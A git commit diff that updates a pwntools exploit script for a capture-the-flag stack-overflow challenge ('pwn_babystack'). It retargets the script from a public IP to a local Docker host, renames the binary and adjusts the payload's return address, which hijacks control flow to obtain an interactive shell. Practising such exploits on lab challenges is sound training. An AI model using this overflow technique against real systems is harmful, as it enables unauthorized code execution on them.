c453a10e25cc541c0dffed973c1ee7cf29cae8c2
ywledoc <ywledoc@outlook.com>
2021-03-11 20:10:37 +0800

    更改基础镜像

--- pwn_babystack/pwn1.py
+++ pwn_babystack/pwn1.py
@@ -5,20 +5,20 @@ from pwn import *
 import sys
 
 if sys.argv[1] == '1':
-    p = remote("114.116.54.89",  10004)
+    p = remote("172.17.0.2",  10000)
 else:
-    p = process("./pwn1")
+    p = process("./pwn_babystack")
 
 #context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
 context.log_level = "debug"
 #gdb.attach(proc.pidof(p)[0])
 
-elf = ELF("./pwn1")
+elf = ELF("./pwn_babystack")
 system_addr = elf.symbols["system"]
 print(hex(system_addr))
 
 #pause()
-payload = "a" * 32 + p64(0xdeadbeef) + p64(0x401142)
+payload = "a" * 32 + p64(0xdeadbeef) + p64(0x401153)
 p.sendline(payload)
 
 p.interactive()
